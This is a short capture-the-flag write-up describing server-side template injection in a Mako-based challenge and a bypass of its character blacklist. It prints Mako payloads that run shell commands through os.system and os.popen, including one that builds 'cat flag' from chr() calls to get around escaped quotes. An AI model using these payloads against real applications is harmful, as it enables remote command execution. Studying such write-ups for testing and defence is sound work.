# Summary {#summary}

SSTI using Mako and bypassing blacklist

# Details {#details}

This challenge had a blacklist. Not only were we not allowed to use certain words, but `<`, `>` and others were being escaped. We had to get creative.

I tried a bunch of things like getting the `pageargs`:

```python
Payload: name=${pageargs}
```

And we got:

```python
Hello {'data': 'world'}!
```

But that didnâ€™t help out much. I then started searching online for some vulnerabilities in Mako. I found this:

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako)

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
...
```

However, I could not use `'` or `"` in my payload, as it got escaped. I remembered that Python has the function `chr`. I used this to my advantage and created the following payload:

![Untitled](/assets/img/sharkv2/Untitled.png)

(%2b is a plus sign, and we are building the words `cat flag` using `chr()`)

```python
${self.module.cache.util.os.popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}
```

After sending this, we get the flag:

CTF{d40de1849fdcdc50b34e23b5acb874aabd8c106c43d837f1d42b12336a51dee0}
